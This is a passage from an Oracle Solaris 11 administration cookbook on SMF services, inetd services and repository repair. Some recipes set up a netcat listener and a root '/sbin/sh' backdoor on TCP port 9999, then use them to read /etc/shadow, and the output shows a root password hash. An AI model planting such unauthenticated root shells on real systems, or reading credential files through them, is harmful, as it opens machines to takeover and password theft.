[ Mar  5 19:14:17 Executing start method ("/lib/svc/method/netcat.sh start"). ]
[ Mar  5 19:14:17 Method "start" exited with status 0. ]</pre></div><p class="calibre7">To test whether our new service is indeed working, run the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">nc localhost 6666</strong>
<strong class="calibre8">pwd</strong>
/root
<strong class="calibre8">cd /</strong>
<strong class="calibre8">pwd</strong>
/
<strong class="calibre8">cat /etc/shadow</strong>
root:$5$oXrpLA3o$UTJJeO.MfjlTBGzJI.yzhHvqhvW.xUWBknpCKHRvP79:16131::::::22560
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">That's amazing!</p><p class="calibre7">We have to check whether the <code class="email">netcat</code> service is able to stop in an appropriate way by executing the following commands:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svcadm disable netcat</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -a | grep netcat</strong>
disabled       19:27:14 svc:/application/netcat:default</pre></div><p class="calibre7">The logfile from the service can be useful to check the service status, as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">tail -f /var/svc/log/application-netcat:default.log</strong>
 [ Mar  5 19:14:16 Enabled. ]
[ Mar  5 19:14:17 Executing start method ("/lib/svc/method/netcat.sh start"). ]
[ Mar  5 19:14:17 Method "start" exited with status 0. ]
^X[ Mar  5 19:27:14 Stopping because service disabled. ]
[ Mar  5 19:27:14 Executing stop method ("/lib/svc/method/netcat.sh stop"). ]
[ Mar  5 19:27:14 Method "stop" exited with status 0. ]</pre></div><p class="calibre7">So far everything has worked! The next step is to extract the current active SMF profile and to modify it in<a id="id818" class="calibre1"/> order to enable the <code class="email">netcat</code> service (<code class="email">&lt;create_default_instance enabled='true'/&gt;</code>) now and during the system boot. To accomplish this task, execute the following commands:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg extract &gt; myprofile.xml</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">vi myprofile.xml</strong>
&lt;?xml version='1.0'?&gt;
&lt;!DOCTYPE service_bundle SYSTEM '/usr/share/lib/xml/dtd/service_bundle.dtd.1'&gt;
&lt;service_bundle type='<strong class="calibre8">profile</strong>' name='<strong class="calibre8">profile</strong>'&gt;

<strong class="calibre8">(truncated output)</strong>

&lt;service name='application/netcat' type='service' version='0'&gt;
    &lt;create_default_instance enabled='<strong class="calibre8">true</strong>'/&gt;
    &lt;single_instance/&gt;
    &lt;dependency name='milestone' grouping='require_all' restart_on='none' type='service'&gt;
      &lt;service_fmri value='svc:/milestone/multi-user'/&gt;
    &lt;/dependency&gt;
    &lt;exec_method name='start' type='method' exec='/lib/svc/method/netcat.sh start' timeout_seconds='120'&gt;
      &lt;method_context&gt;
        &lt;method_credential user='root' group='root'/&gt;
      &lt;/method_context&gt;
    &lt;/exec_method&gt;
    &lt;exec_method name='stop' type='method' exec='/lib/svc/method/netcat.sh stop' timeout_seconds='120'/&gt;
    &lt;property_group name='startd' type='framework'&gt;
      &lt;propval name='duration' type='astring' value='transient'/&gt;
    &lt;/property_group&gt;
    &lt;stability value='Unstable'/&gt;
    &lt;template&gt;
      &lt;common_name&gt;
        &lt;loctext xml:lang='C'&gt;hacker tool (nc)&lt;/loctext&gt;
      &lt;/common_name&gt;
      &lt;documentation&gt;
        &lt;manpage title='nc' section='1' manpath='/usr/share/man'/&gt;
      &lt;/documentation&gt;
    &lt;/template&gt;</pre></div><p class="calibre7">The process of importing and validating must be repeated again (this time for the profile) by running the<a id="id819" class="calibre1"/> following commands:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg validate myprofile.xml</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg import my profile.xml</strong>
</pre></div><p class="calibre7">Check the status of the <code class="email">netcat</code> service again by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -a | grep netcat</strong>
online         19:52:18 svc:/application/netcat:default</pre></div><p class="calibre7">This is unbelievable! The <code class="email">netcat</code> service was configured to <code class="email">enabled</code> in the profile and it was brought to the <code class="email">online</code> state. If we reboot the system, we're going to see the following output:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -a | grep netcat</strong>
<strong class="calibre8">online</strong>         20:02:50 svc:/application/netcat:default
root@solaris11-1:~# <strong class="calibre8">svcs -l netcat</strong>
fmri         svc:/application/netcat:default
name         hacker tool (nc)
enabled      true
state        online
next_state   none
state_time   March  5, 2014 08:02:50 PM BRT
logfile      /var/svc/log/application-netcat:default.log
restarter    svc:/system/svc/restarter:default
<strong class="calibre8">manifest     /root/chapter5/netcat_manifest.xml</strong>
<strong class="calibre8">manifest     /root/chapter5/myprofile.xml</strong>
dependency   require_all/none svc:/milestone/multi-user (online)</pre></div><p class="calibre7">Both the XML files (the manifest and the profile) are shown in the output.</p><div><div><div><div><h3 class="title2"><a id="ch05lvl3sec49" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">A new service was created by performing all the usual steps, such as creating the start/stop script, creating a manifest, importing it, and running the service. Furthermore, you learned how to modify a profile automatically to start a service during the Oracle Solaris 11 boot phase.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05lvl1sec67" class="calibre1"/>Administering inetd-controlled network services</h1></div></div></div><p class="calibre7">In Oracle<a id="id820" class="calibre1"/> Solaris 11, there are services that are out of the SMF context and they are controlled by another (and old) daemon: inetd. Inetd is the official restarter of these network services and, during the tasks where we are managing them, the main command to accomplish all tasks is <code class="email">inetadm</code>. It is time to see how this works.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch05lvl2sec102" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">This procedure requires a virtual machine (using VirtualBox or VMware) running Oracle Solaris 11 and with 4 GB RAM.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch05lvl2sec103" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">Initially, there<a id="id821" class="calibre1"/> are a few interesting services to play with. Therefore, we have to install a good service: <code class="email">telnet</code>. Execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">pkg install pkg://solaris/service/network/telnet</strong>
</pre></div><p class="calibre7">To list the existing inetd services, execute the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">inetadm</strong>
ENABLED   STATE          FMRI
disabled  disabled       svc:/application/cups/in-lpd:default
disabled  disabled       svc:/application/x11/xfs:default
disabled  disabled       svc:/application/x11/xvnc-inetd:default
disabled  disabled       svc:/network/comsat:default
disabled  disabled       svc:/network/stdiscover:default
disabled  disabled       svc:/network/rpc/spray:default
enabled   online         svc:/network/rpc/smserver:default
enabled   online         svc:/network/rpc/gss:default
disabled  disabled       svc:/network/rpc/rex:default
disabled  disabled       svc:/network/nfs/rquota:default
enabled   online         svc:/network/security/ktkt_warn:default
disabled  disabled       svc:/network/stlisten:default
disabled  disabled       svc:/network/telnet:default</pre></div><p class="calibre7">The old and good <code class="email">inetd.conf</code> still exists, but it does not have any relevant content for network service configuration anymore (all lines are commented):</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">more /etc/inet/inetd.conf</strong>
#
# Copyright 2004 Sun Microsystems, Inc.  All rights reserved.
# Use is subject to license terms.
#
#ident  "%Z%%M%  %I%  %E% SMI"
#
# Legacy configuration file for inetd(1M).  See inetd.conf(4).
#
# This file is no longer directly used to configure inetd.
# The Solaris services which were formerly configured using this file
# are now configured in the Service Management Facility (see smf(5))
# using inetadm(1M).
#
# Any records remaining in this file after installation or upgrade,
# or later created by installing additional software, must be converted
# to smf(5) services and imported into the smf repository using
# inetconv(1M), otherwise the service will not be available.  Once
# a service has been converted using inetconv, further changes made to
# its entry here are not reflected in the service.
#</pre></div><p class="calibre7">To collect more <a id="id822" class="calibre1"/>details about the <code class="email">telnet</code> service that we have just installed, it is necessary to run the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">inetadm -l svc:/network/telnet:default</strong>
SCOPE    NAME=VALUE
         name="telnet"
         endpoint_type="stream"
         proto="tcp6"
         isrpc=FALSE
         wait=FALSE
         exec="/usr/sbin/in.telnetd"
         user="root"
default  bind_addr=""
default  bind_fail_max=-1
default  bind_fail_interval=-1
default  max_con_rate=-1
default  max_copies=-1
default  con_rate_offline=-1
default  failrate_cnt=40
default  failrate_interval=60
default  inherit_env=TRUE
default  tcp_trace=FALSE
default  tcp_wrappers=FALSE
default  connection_backlog=10
default  tcp_keepalive=FALSE</pre></div><p class="calibre7">To enable the <code class="email">telnet</code> service, run the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">inetadm -e svc:/network/telnet:default</strong>
root@solaris11-1:~# <strong class="calibre8">inetadm | grep telnet</strong>
enabled   online         svc:/network/telnet:default</pre></div><p class="calibre7">As the <code class="email">telnet</code> service has several attributes, it is feasible to change them, for example, during a troubleshooting session. For example, in order to enable the <code class="email">telnet</code> service to log all its records to the <code class="email">syslog</code> service, execute the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">inetadm -m  svc:/network/telnet:default tcp_trace=true</strong>
root@solaris11-1:~# <strong class="calibre8">inetadm -l telnet | grep tcp_trace</strong>
         tcp_trace=TRUE</pre></div><p class="calibre7">This is great! We can<a id="id823" class="calibre1"/> disable the <code class="email">telnet</code> service when it isn't required anymore:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">inetadm -d svc:/network/telnet:default</strong>
root@solaris11-1:~# <strong class="calibre8">inetadm | grep telnet</strong>
disabled  disabled       svc:/network/telnet:default</pre></div><p class="calibre7">Good! It is time to learn another very interesting and unusual trick in our next example.</p><p class="calibre7">Now, our goal is to create a very simple backdoor as a service in the old <code class="email">inetd.conf</code> file under <code class="email">/etc/inet/</code> and to convert it to SMF. How can we do this? Easy! The first step is to create a service line in the <code class="email">inetd.conf</code> file under <code class="email">/etc/inet/</code> by running the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">vi /etc/inet/inetd.conf</strong>

<strong class="calibre8">(truncated output)</strong>
backdoor  stream  tcp6  nowait  root  /sbin/sh  /sbin/sh -a</pre></div><p class="calibre7">Since we have created the mentioned line in the <code class="email">inetd.conf</code> file, we have to assign a TCP port to this service in the <code class="email">/etc/services</code> file (the last line) by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">vi /etc/services</strong>
<strong class="calibre8">(truncated output)</strong>
backdoor  9999/tcp      # backdoor</pre></div><p class="calibre7">There is a command named <code class="email">inetconf</code> that converts an INET service to an SMF service easily:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">inetconv</strong>
backdoor -&gt; /lib/svc/manifest/network/backdoor-tcp6.xml
Importing backdoor-tcp6.xml ...svccfg: Restarting svc:/system/manifest-import</pre></div><p class="calibre7">To verify that the service was converted to the SMF model as expected, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -a | grep backdoor</strong>
online         20:36:15 svc:/network/backdoor/tcp6:default</pre></div><p class="calibre7">Finally, to test whether the backdoor service is working, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">nc localhost 9999</strong>
<strong class="calibre8">ls</strong>
chapter5
core
Desktop
Documents
Downloads
Public
<strong class="calibre8">cd /</strong>
<strong class="calibre8">pwd</strong>
<strong class="calibre8">/</strong>
<strong class="calibre8">grep root /etc/shadow</strong>
root:$5$oXepLA3w$UTJJeO.MfVl1BGzJI.yzhHvqhvq.xUWBknCCKHRvP79:16131::::::22560</pre></div><p class="calibre7">That's wonderful! The backdoor service is working well!</p><p class="calibre7">Going further, Oracle Solaris 11 offers a command named <code class="email">netservice</code> that opens or closes most network<a id="id824" class="calibre1"/> services (except the <code class="email">ssh</code> service) for any remote access by applying the <code class="email">generic_limited_net.xml</code> profile and configuring the local-only mode attribute from some services. I suggest that you take some time to examine this profile.</p><p class="calibre7">Using the <code class="email">netservices</code> command to close most network services for remote access is easy and can be done by running the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">netservices limited</strong>
restarting svc:/system/system-log:default
restarting svc:/network/smtp:sendmail</pre></div><p class="calibre7">To reverse the status (enabled or disabled) of each network service, run the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">netservices open</strong>
restarting svc:/system/system-log:default
restarting svc:/network/smtp:sendmail</pre></div><div><div><div><div><h3 class="title2"><a id="ch05lvl3sec50" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">You learned how to administer inetd services as well as how to create and transform an inetd service into an SMF service. The main commands in this section were <code class="email">inetadm</code> and <code class="email">inetconv</code>.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05lvl1sec68" class="calibre1"/>Troubleshooting Oracle Solaris 11 services</h1></div></div></div><p class="calibre7">In this<a id="id825" class="calibre1"/> last section of the chapter, you're going to learn how to troubleshoot a service that's presenting an<a id="id826" class="calibre1"/> error and how to fix a corrupted repository.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch05lvl2sec104" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To following the recipe, it'll be necessary to have a virtual machine (using VirtualBox or VMware) with Oracle Solaris 11 installed and 4 GB RAM.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch05lvl2sec105" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">The main role of an administrator is to keep everything working well. The best way to analyze the system is by running the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs –xv</strong>
</pre></div><p class="calibre7">For now, there isn't a problem in the system, but we can simulate one. For example, in the next step, we will break the <code class="email">gedit_script</code> service by taking out a semicolon from its script, as follows:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">vi /lib/svc/method/gedit_script.sh</strong>
#!/sbin/sh
. /lib/svc/share/smf_include.sh
case "$1" in
'start')
DISPLAY=:0.0
export DISPLAY
/usr/bin/gedit &amp;
;-----------------à <strong class="calibre8">Remove this semicolon!</strong>
'stop')
pkill -x -u 0 gedit
;;
*)
echo $"Usage: $0 {start|stop}"
exit 1
;;

esac
exit $SMF_EXIT_OK</pre></div><p class="calibre7">To continue the procedure, the <code class="email">gedit_script</code> service will be disabled and enabled again by executing the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcadm disable svc:/application/gedit_script:default</strong>
root@solaris11-1:~# <strong class="calibre8">svcs -a | grep gedit_script</strong>
disabled        0:22:13 svc:/application/gedit_script:default
root@solaris11-1:~# <strong class="calibre8">svcadm enable svc:/application/gedit_script:default</strong>
You have new mail in /var/mail/root
root@solaris11-1:~# <strong class="calibre8">svcs -a | grep gedit_script</strong>
maintenance     0:29:13 svc:/application/gedit_script:default</pre></div><p class="calibre7">According to the<a id="id827" class="calibre1"/> previous three outputs, we broke the service and started it again quickly, so it has entered the maintenance state. To collect more information about the service in order to focus on the possible cause, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcs -xv svc:/application/gedit_script:default</strong>
svc:/application/gedit_script:default (graphical editor (gedit))
 State: maintenance since March  6, 2014 12:29:13 AM BRT
Reason: Start method failed repeatedly, last exited with status 3.
   See: http://support.oracle.com/msg/SMF-8000-KS
   See: man -M /usr/share/man -s 1 gedit
   See: /var/svc/log/application-gedit_script:default.log
Impact: This service is not running.</pre></div><p class="calibre7">The service isn't running and there are more details from its logfile, as shown:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">tail -f /var/svc/log/application-gedit_script:default.log</strong>
[ Mar  6 00:29:13 Enabled. ]
[ Mar  6 00:29:13 Executing start method ("/lib/svc/method/gedit_script.sh start"). ]
/lib/svc/method/gedit_script.sh: line 2: syntax error at line 9: `)' unexpected
[ Mar  6 00:29:13 Method "start" exited with status 3. ]</pre></div><p class="calibre7">That's fantastic! The Oracle Solaris 11 SMF framework describes the exact line where the error has occurred. To repair the problem, we must fix the broken line (by adding a <code class="email">;</code> again where we removed it from) and restore the service to the <code class="email">online</code> state. Then, after fixing the syntax problem, run the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcadm clear svc:/application/gedit_script:default</strong>
root@solaris11-1:~# <strong class="calibre8">svcs -a | grep gedit_script</strong>
online          0:39:12 svc:/application/gedit_script:default</pre></div><p class="calibre7">That's perfect! The service has come to the online state again!</p><p class="calibre7">Going to the last topic, the SMF repository is accessed through the <code class="email">svc.configd</code> daemon and it's the daemon that controls every read/write operation to the service repository. Furthermore, <code class="email">svc.configd</code> also checks the repository integrity when it starts. Corruption in the repository is rare, but it can happen and in this case, we can repair it with the system either in the online or in the maintenance mode (through the <code class="email">sulogin</code> command). To fix the repository, run the following command;</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">/lib/svc/bin/restore_repository</strong>
</pre></div><p class="calibre7">Take a look at <a class="calibre1" href="http://support.oracle.com/msg/SMF-8000-MY">http://support.oracle.com/msg/SMF-8000-MY</a> for more information on the use of this script to restore backup copies of the <code class="email">smf(5)</code> repository.</p><p class="calibre7">If there are<a id="id828" class="calibre1"/> any problems that need human intervention, this script will give instructions and then exit back to your shell:</p><div><pre class="programlisting">/lib/svc/bin/restore_repository[71]: [: /: arithmetic syntax error
The following backups of /etc/svc/repository.db exist, from
Oldest to newest:

manifest_import-20140117_072325
boot-20140305_132432
manifest_import-20140305_170246
manifest_import-20140305_170535
boot-20140305_180217
boot-20140305_200130
manifest_import-20140305_203615
boot-20140306_005602</pre></div><p class="calibre7">The backups are named based on their types and on the time when they were taken. Backups beginning with <code class="email">boot</code> are made before the first change is made to the repository after the system boot. Backups beginning with <code class="email">manifest_import</code> are made after <code class="email">svc:/system/manifest-import:default</code> finishes its processing.</p><p class="calibre7">The time of backup is given in the <code class="email">YYYYMMDD_HHMMSS</code> format.</p><p class="calibre7">Please enter either a specific backup repository from the previous list to restore it or select one of the following choices:</p><div><pre class="programlisting">  CHOICE      ACTION
  ----------------  ----------------------------------------------
  boot      restore the most recent post-boot backup
  manifest_import    restore the most recent manifest_import backup
  -seed-      restore the initial starting repository  (All
          customizations will be lost, including those
          made by the install/upgrade process.)
  -quit-      cancel script and quit

Enter response [boot]:</pre></div><p class="calibre7">Before choosing an option, you must know which repository backup types exist in the system:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">boot-&lt;timestamp&gt;</code>: In <code class="email">boot-&lt;timestamp&gt;</code>, backups are made after a system boots but before any change is made.</li><li class="listitem"><code class="email">manifest_import-&lt;timestamp&gt;</code>: In <code class="email">manifest_import-&lt;timestamp&gt;</code>, backups are made after <code class="email">svc:/system/manifest-import:default</code> is executed.</li><li class="listitem"><code class="email">--seed--</code>: This restores the initial repository. If we restore this backup, every service or change that was done will be lost!</li></ul></div><p class="calibre7">In this case, we're going<a id="id829" class="calibre1"/> to pick the <code class="email">boot</code> option, as shown:</p><div><pre class="programlisting">Enter response [boot]: <strong class="calibre8">boot</strong>
After confirmation, the following steps will be taken:

svc.startd(1M) and svc.configd(1M) will be quiesced, if running.
/etc/svc/repository.db
    -- renamed --&gt; /etc/svc/repository.db_old_20140306_011224
/etc/svc/repository-boot
    -- copied --&gt; /etc/svc/repository.db 
and the system will be rebooted with reboot(1M).

Proceed [yes/no]? <strong class="calibre8">yes</strong>
</pre></div><p class="calibre7">After the system rebooting, the system comes online again and everything works well!</p><div><div><div><div><h3 class="title2"><a id="ch05lvl3sec51" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">In this chapter, you learned how to find a service error using <code class="email">svcs –xv &lt;fmri&gt;</code> to correct it, to bring the service online again (<code class="email">svcadm clear &lt;fmri&gt;</code>), and in extreme cases, to restore the repository using the <code class="email">/lib/svc/bin/restore_repository</code> command.</p></div></div></div>
<div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05lvl1sec69" class="calibre1"/>References</h1></div></div></div><div><ul class="itemizedlist"><li class="listitem"><em class="calibre11">Oracle Solaris Administration: Common Tasks</em> at <a class="calibre1" href="http://docs.oracle.com/cd/E23824_01/pdf/821-1451.pdf">http://docs.oracle.com/cd/E23824_01/pdf/821-1451.pdf</a></li><li class="listitem"><em class="calibre11">Oracle Solaris 11 </em><a id="id830" class="calibre1"/><em class="calibre11">Administrator's Cheat Sheet</em> at <a class="calibre1" href="http://www.oracle.com/technetwork/server-storage/solaris11/documentation/solaris-11-cheat-sheet-1556378.pdf">http://www.oracle.com/technetwork/server-storage/solaris11/documentation/solaris-11-cheat-sheet-1556378.pdf</a></li></ul></div></div></body></html>